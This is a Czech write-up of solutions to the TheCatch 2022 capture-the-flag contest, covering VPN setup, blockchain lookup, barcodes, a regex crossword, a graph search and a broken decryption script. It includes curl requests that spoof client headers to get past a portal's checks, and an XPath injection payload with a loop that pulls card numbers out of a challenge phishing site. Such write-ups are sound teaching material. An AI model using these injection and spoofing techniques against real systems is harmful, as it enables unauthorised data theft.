# TheCatch 2022

CESNET na podzim 2022 opět uspořádal již tradiční CTF hru [TheCatch](https://www.thecatch.cz/)
se spoustou úloh, ve kterých bylo vždy získat "vlajku" (nějaký kód) ukrytý
v různých podobách na různých místech. Povedlo se mi nakonec získat vlajku ve
14 z 18 úloh a níže se je pokusím popsat svůj postup na jejich řešení.

## Candidate challenges – jednoduchá rozcvička (4/4 bodů)

### VPN access (1/1 bod)

> Hi, promising candidate,
>
> a lot of internal system is accessible only via VPN. You have to
> install and configure OpenVPN properly. Configuration file can be
> downloaded from CTFd's link VPN. Activate VPN and visit testing page
> <http://candidate-test.mysterious-delivery.tcc>, where the control code
> is.
>
> May the Packet be with you!

Tady asi není co vysvětlovat, bylo jen potřeba stáhnout si vygenerovaný
konfigurační soubor pro OpenVPN (s osobním privátním klíčem), spustit OpenVPN,
navštívit stránku na neexistující TLD .tcc dostupnou jenom přes VPNku a z ní
přečíst vlajku.

OpenVPN v Linuxu jednoduše spustíme pomocí:

```sh
sudo openvpn --config ctfd_ovpn.ovpn
```

Trochu trikové bylo jenom DNSka do resolveru. Ve Windows se to stane automaticky,
v Linuxu na to je potřeba pár řádků v konfiguraci navíc. Třeba standardní Debian
instalace OpenVPN obsahuje skript `/etc/openvpn/update-resolv-conf`, který se
postará o přidání DNSka získaného od OpenVPN serveru do systémového resolveru.
Aby se to stalo automaticky, stačí do konfiguračního souboru staženého ze
stránek přidat:

```conf
script-security 2
up /etc/openvpn/update-resolv-conf
down /etc/openvpn/update-resolv-conf
down-pre
```

Na <http://candidate-test.mysterious-delivery.tcc> pak byla k nalezení vlajka
`FLAG{kBXt-jdGI-EwwT-6pfp}`.

### Bitcoin wallet (1/1 bod)

> Hi, promising candidate,
>
> our customers paying by bitcoin to our wallet
> `bc1q8vnufzpyurlnvrxavrn2vxe5z0nafrp2d8nzng` can get their package pickup code
> on<http://pay-check.mysterious-delivery.thecatch.cz> by entering their wallet
> ID.
>
> Find out the pickup code for package that has not yet been claimed, although
> it was already paid for on Aug 8th 2022.
>
> May the Packet be with you!

Dostali jsme ID Bitcoinové peněženky, na kterou byla provedena platba. Díky své
podstatě je Bitcoin (a jiné blockchainové kryptoměny) v podstatě otevřená účetní
kniha, kde lze dohledat všechny transakce týkající se nějaké peněženky.

Existuje mnoho webů umožňující náhled na jednotlivé transakce, stačí se podívat
třeba na <https://www.blockchain.com/btc/address/bc1q8vnufzpyurlnvrxavrn2vxe5z0nafrp2d8nzng>.

Tam nalezneme, že na tuto peněženku byla provedena jediná transakce z Bitcoinové
peněženky `bc1qrqqjjuefgc4akxl05cd4haxp5jznmmptjrllft`. Toti ID zadáme do
připraveného webu a když si necháme zobrazit poznámku, dostaneme vlajku
`FLAG{PWei-v9hV-tekF-ptEl}`.

### Unknown package (1/1 bod)

> Hi, promising candidate,
>
> the cleaning drones have taken pictures of some abandoned unknown package in
> our backup depot. The AI claims that the analysed item is in no way a package,
> instead it repeats "cat - animal - dangerous - avoid".
>
> Get as much as possible information about the package.
>
> Download [taken pictures](https://owncloud.cesnet.cz/index.php/s/YxcC6BP430nR5en)
> (MD5 checksum `c6f700e1217c0b17b7d3a35081c9fabe`).
>
> May the Packet be with you!

Ve staženém ZIPu jsou dvě fotky balíčku, jedna s hezkými obrázky a druhá
s různými kódy. Když si je načteme (třeba telefonem z obrazovky, nebo zavoláním
`zbarimg unknown_package_2261_2.JPG` z balíčku `zbar-tools`), zjistíme
následující:

* QR kód obsahuje adresu:

  ```text
  Mr. Erwin Rudolf Josef Alexander Schrodinger
  CESNET, a.l.e.
  Zikova 4
  Prague 6
  160 00
  ```

* První čárový kód (formátu CODE-128) obsahuje hledanou vlajku: `FLAG{Oics-NF3B-vUOC-pUMt}`
* Druhý čárový kód (taky formátu CODE-128) obsahuje instrukce: cat inside, feed
  twice a day, do not shake
* Třetí čárový kód (formátu CODE-39) obsahuje text: `234-821-568-142P` (co
  znamená jsem bohužel nezjistil, ale nebylo to třeba)

### Regex crossword (1/1 bod)

> Hi, promising candidate,
>
> you have to prove the knowledge of regular expressions. Our Finnish recruiter
> Timo has prepared some crossword suitable for > this purpose.
>
> Download [task
> description](https://owncloud.cesnet.cz/index.php/s/ODNoiM6g74pK73L) (MD5
> checksum `6448c1748cc6047470a5f00c3945c1c4`).
>
> May the Packet be with you!

Tohle se mi líbilo, mám rád regulární výrazy a křížovky :) Pro budoucí generace
jsem zachoval původní zadání i zde v repozitáři: [PDF se zadáním](05_Regex_crossword/finnish_regular_test.pdf)

Řešení bylo jednoduché (pro aktuální absenci tiskárny jsem vyplňoval
v [Xournal++](https://xournalpp.github.io/)). Šlo si všimnout, že všechny tři
uhlopříčky vynucují jistou měrou symetrii okolo prostředka. Vyplňování šlo
zahájit u některých jistých znaků a postupně doplňovat:

![řešení](05_Regex_crossword/finnish_regular_test.svg)

Nakonec z toho vyšlo symetrické řešení `USE{FLAG{SUOM-ULOT-TOLU-MOUS}GALF}ESU`,
z kterého stačilo vzít jen správnou podčást.

## Incidents (10/10 bodů)

### Route tracking (2/2 body)

> Hi, packet inspector,
>
> our company uses on-board route recorders, so traffic controller can optimize
> movement of all vehicles and also control the schedule. Any route can be
> described by a text string that contains the codes of individual sites in the
> order in which they were visited (except depot, because each drive starts and
> also ends there).
>
> Unfortunately, one of the recorders has been damaged and the particular sites
> were not recorded, just the total length of the route is known (exactly 163
> 912 meters). In addition, the driver told us that he never visited the same
> place more than once (except depot, of course).
>
> Your task is to identify the exact route of the vehicle.
>
> Download [the map of vehicle operating area and backround info](https://owncloud.cesnet.cz/index.php/s/LKjPzl5QawyisH3)
> (MD5 checksum `5fd3f52bcb404eae543eba68d7f4bb0a`).
>
> May the Packet be with you!

Celkem přímočará algoritmická úloha, kde na vstupu dostaneme graf (vrcholy a hrany
mezi nimi) a cílem je najít cestu ze startu do startu, která má přesně zadanou
délku. Při pohledu na graf v PNG souboru si všimneme, že jednotlivé vrcholy mají
jednopísmenné kódy, mezi nimiž je například i `{`, `}` a `-`, což jsou znaky
vyskytující se ve formátu vlajky. Vypadá to, že pokud nalezneme cestu splňující
zadané parametry, tak dostaneme vlajku z kódů vrcholů, přes které procházíme.

První částí úlohy bylo **načtení vstupu**, protože jsme ho dostali popsaný jen
v `.dot` souboru pro [Graphviz](https://graphviz.org/). Ten se dá buď naparsovat
ručně (není to příliš složitý formát), nebo lze použít nějakou již hotovou
knihovnu (Graphviz je docela používaný). Já jsem zvolil druhou možnost a použil
knihovnu [`pydot`](https://pypi.org/project/pydot/) pro Python.

Nyní již máme načtené vrcholy a hrany, druhou částí řešení je **nalezení cesty
zadné délky**. Potřebujeme vymyslet vhodný algoritmus.

Pokud bychom chtěli úlohu vyřešit obecně v rozumném polynomiálním čase, asi by
se nám moc dobře nevedlo, úloha je totiž NP-úplná (hledání cesty zadané délky se
dá celkem snadno převést na rozhodovací problém existence [Hamiltonovské
kružnice](https://cs.wikipedia.org/wiki/Hamiltonovsk%C3%BD_graf) pomocí hledání
cesty délky N v jednotkovém grafu… a hledání Hamiltonovské kružnice je známý
NP-úplný problém).

Nám ale stačí úlohu vyřešil hrubou silou pro rozumně malý graf. Můžeme například
zvolit prohledávání do hloubky (DFS), které si bude značit (a při návratu
odznačovat) použité vrcholy a které budeme zařezávat po překročení hledané délky
cesty. Přesně takto jsem ho implementoval, viz: [`solver.py`](09_Route_tracking/solver.py)

Toto řešení má exponenciální časovou složitost, ale pro náš malý graf je
dostačující a prakticky okamžitě najde výsledek `FLAG{SLiH-QPWV-hIm5-hWcU}`.

### Van keys (2/2 body)

> Hi, packet inspector,
>
> all our delivery vans use password instead of standard car keys. Today, we
> have found out that the AI has implemented a new security measure – the vans
> are now referred as "AES Vans" and the password has been changed and
> encrypted. The decryption part is not yet finished, so we can't start any
> delivery van since morning!
>
> Good news is that we managed to get the latest version of the decryption
> script from git repository. Bad news is that the script is not finished yet!
> Your task is to the finalize the script and decrypt the password as soon as
> possible.
>
> Download [the script and encrypted password](https://owncloud.cesnet.cz/index.php/s/J6oePmHEplrCXii)
> (MD5 checksum `e67c86a277b0d8001ea5b3e8f6eb6868`).
>
> May the Packet be with you!

Ve staženém balíčku šlo najít soubory `code.py` a `van_keys_enc.aes`. Kód měl
zdá se sloužit k dešifrování `van_keys_enc.aes` souboru, ale je rozbitý a neúplný.

Postupně v kódu opravíme chyby (a zastaralosti):

* Na moderních systémech už není `python` ale explicitně `python3`, opravíme
  tedy shebang na `#!/usr/bin/env python3`
* Přidáme import chybějících knihoven: `base64`, `hashlib`, `random`
* Vypadá to, že kód editovalo více lidí a jeden odsazoval tabulátory a druhý
  mezerami, Python tohle nemá rád. Opravíme tedy vše na mezery (v tomhle hodně
  pomůže zobrazení whitespace znaků v editoru).
* Přidáme scházející dvojtečky za řídícími sekvencemi (za `def decrypt…` a za
  `for` cyklem)

Poté musíme doplnit scházející kód namísto `TODO`. Je to celkem přímočaré:

```python3
    with open("van_keys_enc.aes", "rb") as f:
        content = f.read()

    print(obj.decrypt(content))
```

Teď již máme spustitelný skript, ale schází mu soubor `pi_dec_1m.txt`. Chvíle
hledání na internetu nám prozradí, že se jedná o soubor s prvním milionem cifer
čísla π, který lze snadno stáhnout například [zde](https://pi2e.ch/blog/2017/03/10/pi-digits-download/).

Po jeho stažení už nám skript ochotně dekóduje vlajku: `FLAG{ITRD-Pyuv-JuLt-9zpM}`

*Komentář: Vyrábět super-secure klíč z lehce rekonstruovatelného klíče je velmi
špatné použití kryptografického systému (zde naschvál použitého kvůli soutěži).
Správně by proces výroby klíče neměl být již nikdy replikovatelný (ani při úniku
zdrojových kódů), klíč by měl vyroben jen jednou a bezpečně uložen.*

### Messenger portal (3/3 body)

> Hi, packet inspector,
>
> our messengers are dependent on aplication called Messenger portal when they
> are in the field. It allows to display various information they need to do
> their jobs on their special mobile devices.
>
> Currently, the AI has installed new modern and fully responsive version of the
> Messenger portal – even the validation of messenger numeric ID is not
> implemented yet and the messengers report problem with displaying details of
> they deliveries.
>
> You have to analyze the [Messenger portal](http://messenger-portal.mysterious-delivery.thecatch.cz/)
> and find some way to get detail information about deliveries. Hurry, please,
> the packages are pilling up!
>
> May the Packet be with you!

Tahle úloha byla spíše mechanicky otravná, ale hezky ilustruje, co všechno může
web zjistit o klientském prohlížeči a zařízení.

Po načtení stránky zjistíme, že se dostáváme na jakýsi Messenger portál, kam lze
do jediného formulářového políčka zadat identifikaci poslíčka. Když do políčka
zkusíme zadat nějaké písmeno, zahlásí nám web "Invalid messenger identifier.",
když tam zkusíme zadat nějaké číslo (protože ID jsou přece čísla), tak se
nestane na první pohled nic.

Zkoumání Javascriptu ukazuje, že je nehezky obfuscovaný, tak nejdříve zaměříme
zkoumání na jeho chování. Otevřeme si tedy debug konzolu prohlížeče a zjistíme,
že ve chvíli odeslání políčka s číslem udělá Javascript request na server, ze
kterého dostane nazpátek zprávu, kterou zaloguje do konzole: `Detected
unsupported device. Only mobile devices are supported.`

Podíváme se, co jsem poslali za request a jak mohl server poznat, že nejsm
mobil. Request byl POST a poslali jsme:

```text
messenger: NTEyMA==
messenger_identifier: 1
```

Druhý řádek je jasný, to je hodnota z formuláře. Ale co první řádek? Dekódujeme
ho pomocí base64 a zjistíme, že je to šířka naší obrazovky (v tomto případě 5120
pixelů), kterou umí snadno zjistit klientský Javascript. Zkusme tedy poslat užší
rozlišení, třeba ručně pomocí curlu:

```sh
$ curl 'http://messenger-portal.mysterious-delivery.thecatch.cz/' -X POST --data-raw 'messenger=NTEyMA%3D%3D&messenger_identifier=1'
{"debugInfo":"Detected unsupported device. Only mobile devices are supported.","message":""}

$ curl 'http://messenger-portal.mysterious-delivery.thecatch.cz/' -X POST --data-raw 'messenger=NTc2Cg%3D%3D&messenger_identifier=1'
{"debugInfo":"Detected unsupported web browser! Only The Catcher\/1.0\/2022 is supported.","message":"Unsupported browser!"}
```

Je vidět, že v závislosti na šířce displeje nám dává server jiné odpovědi, vrchní
curl je se šířkou 5120, spodní je se šířkou 576 (největší šířka, na kterou již
dá server jinou odpověď a pustí nás o úroveň dál).

Teď se ale serveru nelíbí náš browser, jak pozná ten? Browser ve chvíli requestu
posílá serveru řadu hlaviček, mezi nimi například i hlavičku `User-Agent`, kde
se představí. Normálně takhle hlavička vypadá třeba takto: `User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0`. Zkusme se tedy serveru představit jinak:

```sh
$ curl 'http://messenger-portal.mysterious-delivery.thecatch.cz/' -X POST -H 'User-Agent: The Catcher/1.0/2022' --data-raw 'messenger=NTc2Cg%3D%3D&messenger_identifier=1'
{"debugInfo":"Detected unsupported OS! Only MessengerOS is supported.","message":"Unsupported OS!"}
```

To zdá se nestačí. Browsery o sobě totiž v `User-Agent` hlavičce vyžvaní i
operační systém, na kterém běží. Běžný formát této hlavičky (začátek je tam
hlavně kvůli zpětné kompatibilitě z dřevních dob internetu) vypadá podle stránek
[MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/User-Agent) takto:

```text
User-Agent: Mozilla/5.0 (<system-information>) <platform> (<platform-details>) <extensions>
```

Pošleme tedy vylepšený request:

```sh
$ curl 'http://messenger-portal.mysterious-delivery.thecatch.cz/' -X POST -H 'User-Agent: Mozilla/5.0 (MessengerOS) The Catcher/1.0/2022' --data-raw 'messenger=NTc2Cg%3D%3D&messenger_identifier=1'
{"redirect":1}
```

Nazpátek nám přijde tajemné `{"redirect":1}`, ale redirect to není (odpověď má
status kód 200 a neobsahuje hlavičku `Location`), co s tím teď? Vypadá to, že
přesměrování má udělat obfuscovaný Javascript na straně klienta.

Zkusíme alternativní přístup a to emulace mobilu v rámci devtools ve Firefoxu.
Navolíme šířku na nejvýše 576 pixelů, přepíšeme UA na `Mozilla/5.0 (MessengerOS)
The Catcher/1.0/2022` a pošleme request. A ejhle, něco se stalo, Firefox se
pokusil zobrazit iframe, jen ho zablokoval kvůli nenastavenému
[`X-Frame-Options`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options).
Z devtools ale zjistíme adresu `?messenger-jobs` a můžeme pokračovat naším curlem.

Když zkusíme stáhnout tuto stránku samostatně (první příkaz), tak dostaneme opět
stránku s formulářem, takže nic zajímavého. Ale mohli jsme si všimnout, že nazpět
při předchozích requestech dostáváme Cookie `PHPSESSID`, do které se asi něco
ukládá na straně serveru. Vezmeme si tedy cookie, kterou dostaneme nazpět
z POSTu, a pošleme ji s GETem na novou adresu:

```sh
$ curl -v 'http://messenger-portal.mysterious-delivery.thecatch.cz/' -X POST -H 'User-Agent: Mozilla/5.0 (MessengerOS) The Catcher/1.0/2022' --data-raw 'messenger=NTc2Cg%3D%3D&messenger_identifier=1' 2>&1 | grep Cookie
< Set-Cookie: PHPSESSID=ad44fc0ce88d5a611e26180118ef406b; path=/

$ curl 'http://messenger-portal.mysterious-delivery.thecatch.cz/?messenger-jobs' -H 'User-Agent: Mozilla/5.0 (MessengerOS) The Catcher/1.0/2022' -H 'Cookie: PHPSESSID=ad44fc0ce88d5a611e26180118ef406b' -H 'Referer: http://messenger-portal.mysterious-delivery.thecatch.cz/'
{"message":"Only requests from messenger-portal.mysterious-delivery.thecatch.cz server are allowed."}
```

To začíná vypadat nadějně. Ještě přidáme hlavičku `Referer` a vlajka je naše:

```sh
$ curl 'http://messenger-portal.mysterious-delivery.thecatch.cz/?messenger-jobs' -H 'User-Agent: Mozilla/5.0 (MessengerOS) The Catcher/1.0/2022' -H 'Cookie: PHPSESSID=ad44fc0ce88d5a611e26180118ef406b' -H 'Referer: http://messenger-portal.mysterious-delivery.thecatch.cz/'

          <p>
            <strong>Recipient:</strong><br>
            CESNET, z. s. p. o.
          </p>
          <p>
            <strong>Address:</strong><br>
            Zikova 4, Praha<br>
            160 00
          </p>
          <p>
            <strong>Note:</strong><br>
            <span style="direction: rtl; unicode-bidi: bidi-override !important;">{EEw1-z9Tx-6Hb3-nJjC}GALF</span>
          </p>
```

### Fraudulent e-mail (3/3 body)

> Hi, packet inspector,
>
> we have a apparently problem with some fraudulent payment gateway (see
> forwarded e-mail). We suspect that many of our customers have come across this
> scam.
>
> Identify all card numbers entered into the fraudulent webpage (we have to
> report incident and its details to CSIRT-TCC).
>
> Download [fraudulent e-mail](https://owncloud.cesnet.cz/index.php/s/sP8kJqndbmYzQoj)
> (MD5 checksum `94c7696bed436cd63a490de4008d2022`).
>
> May the Packet be with you!

Ze staženého emailu vykoukáme, že se jedná o typický phishing odkazující na
podvodnou stránku <http://really.sneaky.phishing.thecatch.cz>.

Když ji navštívíme, všimneme si, že chce číslo a další údaje k naší kartě. Tak
jí zkusme nějaké údaje dát. Po chvíli zjistíme, že si Javascriptem kontroluje,
že délka jména je alespoň dva znaky, délka CVV kódu je přesně tři znaky a číslo
karty musí být dlouhé buď 16 nebo 19 znaků a musí to být číslo a expirace musí
být dlouhá 7 znaků.

Když však vypneme Javascript, zjistíme, že validační podmínky na straně serveru
jsou jiné – expirace musí být validní číslo, podmínky na jméno a CVV jsou stejné,
ale číslo karty klidně může být jakýkoliv string, pokud je dlouhý nejvýše 19
znaků. Pojďme si tedy hrát s číslem karty.

Zkusme poslat `"`, to občas něco rozbije. A ejhle, na vršku stránky se zobrazil
warning:

```text
Warning
: SimpleXMLElement::xpath(): Unfinished literal in
/var/www/html/index.php
on line
82
```

Je dobré skrývat warningy v produkci, ale tady to autor neudělal, takže
zjišťujeme, že číslo karty asi prochází skrze PHP funkci [xpath](https://www.php.net/manual/en/simplexmlelement.xpath.php),
která spouští XPath dotazy na XMLku. To vypadá zajímavě.

Pojďme si to XMLko postupně prohlédnout, inspirování různými dotazy ze stránky
[XPATH injection](https://book.hacktricks.xyz/pentesting-web/xpath-injection):

* XPATH dotaz `*` by nám měl vrátit jakýkoliv element (typicky ten první, na
  který narazí), zkusme ho. Po odeslání dostaneme právu
  `This card 4556-1329-8889-9614 is broken`. To vypadá že v XMLku jsou uložená
  čísla všech karet.
* XPATH dotaz `//*` by měl vybrat všechny elementy v dokumentu, vrátí to stejné
  číslo karty. Vypadá to, že PHP kód bere jen první výsledek. Pro vylistování
  všech karet je tedy budeme muset nějak projít.
* Vyzkoušíme postupně sestupovat hierarchií, abychom zjistili, kde je uložené
  číslo karty: `/*[1]` nic nevrátí, `/*[1]/*[1]` taky ne, `/*[1]/*[1]/*[1]`
  vrátí číslo karty.
* Zkusíme indexovat první úroveň, `/*[2]/*[1]/*[1]` nevrátí nic. Zkusíme
  indexovat druhou úroveň, `/*[1]/*[2]/*[1]` vrátí druhé číslo karty
  `5560-1204-0367-6130`. Namátkově zkusíme `/*[1]/*[100]/*[1]` a taky vrátí
  číslo. Těch karet je tam hodně, bude to chtít zautomatizovat.

Napsal jsem si proto jednoduchý curl a zjistil jsem, že karet je tam celkem 138
(další dotazy už nic nevrací):

```sh
for i in `seq 138`; do
    echo -n "$i"
    curl 'http://really.sneaky.phishing.thecatch.cz/' -s -X POST --data-raw "card-holder-name=XX&card-number=%2F*%5B1%5D%2F*%5B$i%5D%2F*%5B1%5D&card-expires-date=11%2F2022&card-cvv=111&proceed-to-pay="
done
```

Pak již stačilo si z každé stránky grepem vystřihnout číslo karty a 128. číslo
karty byla hledaná vlajka: `FLAG{0BF0-RREd-vAK3-1Ayi}`.

Celý skriptík: [`solve.sh`](11_Fraudulent_email/solve.sh)

## Miscellaneous (9/9 bodů)

TODO

## Corporate websites (7/25 bodů)

Tato část mě skutečně potrápila a zde se rozhodovalo o vítězství. Bohužel se mi
povedlo vyřešit jen dvě ze šesti úloh, i když k řešení některých dalších jsem
měl trochu našlápnuto. Bohužel se však nezadařilo.

TODO
